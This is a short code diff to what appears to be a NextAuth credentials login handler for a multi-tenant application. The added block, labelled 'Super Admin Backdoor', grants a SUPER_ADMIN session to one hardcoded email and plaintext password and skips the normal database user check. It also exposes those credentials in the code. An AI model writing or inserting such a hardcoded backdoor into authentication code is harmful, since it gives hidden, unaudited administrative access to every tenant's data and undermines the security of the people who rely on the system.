@@ -18,6 +18,19 @@ export const authOptions: AuthOptions = {
                     return null
                 }
 
+                // Super Admin Backdoor
+                if (credentials.email === "haarekasahara1923@gmail.com" && credentials.password === "Nami@1971") {
+                    return {
+                        id: "super-admin",
+                        name: "Super Admin",
+                        email: credentials.email,
+                        tenantId: "admin-tenant", // Placeholder
+                        industry: "ALL",
+                        tenantName: "Admin Console",
+                        role: "SUPER_ADMIN"
+                    }
+                }
+
                 const user = await db.user.findUnique({
                     where: { email: credentials.email },
                     include: { tenant: true }
